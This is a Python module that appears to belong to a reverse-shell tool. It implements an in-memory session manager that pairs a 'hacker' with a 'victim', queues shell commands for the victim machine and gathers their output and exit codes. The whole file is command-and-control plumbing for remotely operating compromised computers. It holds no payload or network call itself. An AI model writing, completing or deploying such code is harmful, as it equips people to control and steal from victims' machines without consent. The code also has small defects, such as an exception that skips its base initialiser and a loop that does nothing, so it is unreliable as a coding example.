# --- the imports
from abc import ABC, abstractmethod
from typing import Optional, TypedDict

import reverse_shell.utils as ut


class Output(TypedDict):
    stdout: str
    stderr: str


class Response(TypedDict):
    response: Output
    command_status_code: Optional[int]
    failed_to_execute: bool


class Communication(TypedDict):
    command: str | None
    responses: list[Response]


class SessionKeys(TypedDict):
    hacker_id: Optional[str]
    victim_id: str
    alive: bool


class SessionDoesNotExist(Exception):
    """Exception raised if session doesn't exist."""

    def __init__(self, session_id: str):
        self.message = f"The session `{session_id}` doesn't exist"
        super().__init__(self.message)


class ClientAlreadyInSession(Exception):
    """Exception raised if the client is already in a session"""

    def __init__(self, client_id: str):
        self.message = f"The client `{client_id}` is already in a session."


class SessionManager(ABC):
    """Manages sessions(hackers with victims) and allows to add new sessions, delete existing ones
    and etc... using a session_id."""

    @abstractmethod
    def add_session(self, hacker_id: str, victim_id: str) -> str:
        pass

    @abstractmethod
    def kill_session(self, session_id: str):
        pass

    @abstractmethod
    def edit_session(
        self,
        session_id: str,
        hacker_id: Optional[str] = None,
        victim_id: Optional[str] = None,
    ):
        pass

    @abstractmethod
    def check_session_alive(self, session_id: str) -> bool:
        pass

    @abstractmethod
    def remove_session(self, session_id: str):
        pass

    @abstractmethod
    def get_session(self, session_id: str) -> SessionKeys:
        pass

    @abstractmethod
    def get_session_id(self, client_id: str) -> Optional[str]:
        pass

    @abstractmethod
    def insert_command(self, session_id: str, cmd: str):
        pass

    @abstractmethod
    def insert_response(
        self,
        session_id: str,
        stdout: str,
        stderr: str,
        command_status_code: Optional[int],
        failed_to_execute: bool,
    ):
        pass

    @abstractmethod
    def get_command(self, session_id: str) -> Optional[str]:
        pass

    @abstractmethod
    def get_response(self, session_id: str) -> list[Response]:
        pass

    @abstractmethod
    def check_session_exists(self, session_id: str) -> bool:
        pass

    @abstractmethod
    def check_client_in_session(self, client_id: str) -> bool:
        pass


# ---- Session implementations
class InMemorySessionManager(SessionManager):
    """An InMemory implementation of `Sessions` using python dictionaries."""

    def __init__(self):
        # Let's define variables and data structures that help us
        # control the sessions

        self._sessions: dict[str, SessionKeys] = {
            # session_id: SessionKeys
        }

        # The way the hacker and the victim talk is through this database.
        self._session_communications: dict[str, Communication] = {
            # session_id: Communication
        }

    def add_session(self, hacker_id: str, victim_id: str) -> str:
        """Create a new session based on the hacker and victim id provided."""
        # First check if either the hacker or the hacker are already in  a session.
        if self.check_client_in_session(hacker_id):
            raise ClientAlreadyInSession(hacker_id)

        if self.check_client_in_session(victim_id):
            raise ClientAlreadyInSession(victim_id)

        # Creating the session id
        session_id: str = ut.generate_token()

        # Initializing the data in both dictionaries
        self._sessions[session_id] = {
            "hacker_id": hacker_id,
            "victim_id": victim_id,
            "alive": True,
        }

        self._session_communications[session_id] = {
            "command": None,
            "responses": [],
        }

        # And also add the hacker and victim in the client list
        return session_id

    def kill_session(self, session_id: str):
        """Deactivate the given session"""
        # Make sure the session exists before activation
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Let's deactivate the session
        self._sessions[session_id]["alive"] = False

        # And then remove the given client from the client_list
        # and also change the hacker_id value in the session
        # to None.
        self._sessions[session_id]["hacker_id"] = None

    def edit_session(
        self,
        session_id: str,
        hacker_id: Optional[str] = None,
        victim_id: Optional[str] = None,
    ):
        """Edit the session, change the hacker_id and victim_id properties.
        if you don't want to change a session_id leave it set to None."""
        # Session sanity check
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now if the session does exist, it's just a matter of simple
        # if conditions
        if hacker_id is not None:
            self._sessions[session_id]["hacker_id"] = hacker_id
        if victim_id is not None:
            self._sessions[session_id]["victim_id"] = victim_id

    def check_session_alive(self, session_id: str) -> bool:
        """Check if the given session is alive"""
        # first check if the session exists
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        return self._sessions[session_id]["alive"]

    def remove_session(self, session_id: str):
        """Remove the session based on the session id."""
        # First check if the session exists
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now let's fetch the hacker and victim with that session_id
        hacker_victim_ids = self._sessions[session_id]

        # Removing them from the client_list list
        for client_id in list(hacker_victim_ids.values())[:-1]:
            if client_id is None:
                # This only happens if a hacker exited a session
                # and it is being removed now se we can skip it
                continue

        del self._session_communications[session_id]
        del self._sessions[session_id]

    def get_session(self, session_id: str) -> SessionKeys:
        """Get the session i.e the hacker and victim inside it using the session_id."""
        # First check if the session is up and running
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        return self._sessions[session_id]

    def get_session_id(self, client_id: str) -> Optional[str]:
        """Get the session id using the client_id"""
        if not self.check_client_in_session(client_id):
            return None

        session_id = [
            session_id
            for session_id, session in self._sessions.items()
            if session["victim_id"] == client_id or session["hacker_id"] == client_id
        ][0]

        return session_id

    def insert_command(self, session_id: str, cmd: str):
        """Insert a new in the session provided"""
        # First let's see if the session is active
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now let's insert the command inside the session
        self._session_communications[session_id]["command"] = cmd

    def insert_response(
        self,
        session_id: str,
        stdout: str,
        stderr: str,
        command_status_code: Optional[int],
        failed_to_execute: bool,
    ):
        """Add the response given in the responses list."""
        # As always first check if the session is active
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now append the response in the list of responses
        self._session_communications[session_id]["responses"].append(
            {
                "response": {"stdout": stdout, "stderr": stderr},
                "command_status_code": command_status_code,
                "failed_to_execute": failed_to_execute,
            }
        )

    def get_command(self, session_id: str) -> Optional[str]:
        """Fetch the command from the communications."""
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Fetch the command from the session communications
        cmd = self._session_communications[session_id]["command"]
        # Resetting the command to an empty string
        self._session_communications[session_id]["command"] = None
        return cmd

    def get_response(self, session_id: str) -> list[Response]:
        """Fetch the responses from the communications"""
        # Check if the session is active
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Fetch all responses
        res = self._session_communications[session_id]["responses"]
        self._session_communications[session_id]["responses"] = []
        return res

    def check_session_exists(self, session_id: str) -> bool:
        """Check if the given session exists and is active."""
        return True if self._sessions.get(session_id, None) is not None else False

    def check_client_in_session(self, client_id: str) -> bool:
        """Check if the given client is in a session. The client should be either a victim or hacker"""
        sessions = list(self._sessions.values())
        for session in sessions:
            if client_id == session["hacker_id"]:
                return True
            elif client_id == session["victim_id"]:
                return True

        return False
